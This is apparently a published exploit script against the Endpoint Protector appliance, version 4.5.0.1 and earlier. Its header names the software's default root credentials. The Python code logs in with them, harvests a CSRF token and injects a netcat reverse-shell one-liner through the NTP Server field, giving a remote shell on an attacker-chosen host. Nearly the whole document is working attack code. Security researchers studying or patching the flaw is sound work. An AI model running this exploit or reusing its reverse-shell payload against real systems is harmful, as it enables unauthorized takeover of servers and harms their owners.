# Author : 0x09AL
# Tested on : Endpoint Protector 4.5.0.1
# Software Link : https://www.endpointprotector.com/
# Vulnerable Versions : Endpoint Protector <= 4.5.0.1
# Endpoint Protector suffers from an authenticated command injection vulnerability. By default the username and password are : root:epp2011
# In the Appliance Tab , Server Maintenance the NTP Server field is vulnerable to command injection. There is a call to sh -c {NTP Server field} which is not validated. Attached is the exploit which does this automatically.
# The command may take a while to execute.
 
import requests
exp = requests.session()
user_agent = &#039;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0&#039;
 
 
username = &#039;root&#039;
password = &#039;epp2011&#039;
 
host = &#039;x.x.x.x.x&#039;
rev_host = &#039;x.x.x.x&#039;
rev_port = &#039;443&#039;
 
r = exp.post(&#039;https://%s/index.php/login&#039; % host,data={&#039;username&#039;:username,&#039;password&#039;:password,&#039;login&#039;:&#039;Login&#039;},verify=False)
 
shell = &#039;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f&#039; % (rev_host,rev_port)
 
payload = &#039;&& %s&#039; % shell
print payload
if(r.text.find("Welcome Guest")>0):
    print "[-] Incorrect credentials [-]"
else:
    print "[+] Logged in successfully [+]"
    r = exp.get(&#039;https://%s/index.php/appliance/maintenance&#039; % host,headers={&#039;X-Requested-With&#039;: &#039;XMLHttpRequest&#039;},verify=False)
    if(r.text.find("csrf")>-1):
        print "[+] Getting CSRF Token [+]"
        csrf_token = r.text.split(&#039;value="&#039;)[1].split(&#039;">&#039;)[0]
         
        print "[+] Token: %s [+]" % csrf_token
        post_data = {
            &#039;csrf_token&#039;   : csrf_token,
            &#039;continent&#039;    :&#039;Europe&#039;,
            &#039;region&#039;       :&#039;Berlin&#039;,
            &#039;timeSetting[ntpserver]&#039;    : payload,
            &#039;timeSetting[timesync]&#039;     :&#039;12&#039;
        }
        r = exp.post(&#039;https://%s/index.php/appliance/timezone&#039; % host,data=post_data,headers={&#039;X-Requested-With&#039;: &#039;XMLHttpRequest&#039;,&#039;Referer&#039;: &#039;https://%s/index.php/&#039; % host},verify=False)
        print "[+] Sending exploit [+]"
         
        if(r.text.find("nc")>-1):
            post_data = {
                &#039;ntpserver&#039;: payload,
                &#039;continent&#039;    :&#039;Europe&#039;,
                &#039;region&#039;       :&#039;Berlin&#039;
            }
 
            r = exp.post(&#039;https://%s/index.php/appliance/timezone&#039; % host,data=post_data,headers={&#039;X-Requested-With&#039;: &#039;XMLHttpRequest&#039;,&#039;Referer&#039;: &#039;https://%s/index.php/&#039; % host},verify=False)
            print "[+] Exploit success [+]"

